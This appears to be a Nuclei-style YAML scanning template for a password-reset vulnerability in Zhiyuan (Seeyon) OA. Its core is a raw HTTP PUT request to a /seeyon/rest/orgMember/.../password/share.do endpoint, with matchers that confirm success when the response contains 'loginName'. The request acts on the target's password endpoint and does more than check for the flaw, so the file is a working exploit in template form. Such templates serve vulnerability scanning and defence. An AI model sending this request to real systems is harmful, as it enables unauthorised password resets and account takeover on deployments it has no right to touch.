id: zhiyuanOA-ucpcLogin-pass-reset
info:
  name: 致远OA-ucpcLogin密码重置漏洞
  author: cnaq
  severity: high  
  description: 致远OA-ucpcLogin密码重置漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E8%87%B4%E8%BF%9COA-ucpcLogin%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E.md
  tags: zhiyuanOA,info,leak

requests:
  - raw:
      - |
        PUT /seeyon/rest/orgMember/-7273032013234748168/password/share.do HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Cookie: JSESSIONID=3891CB3E3CA435C599001E4F03A335B0; loginPageURL=


    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
      - type: word
        part: body
        words:
          - 'loginName'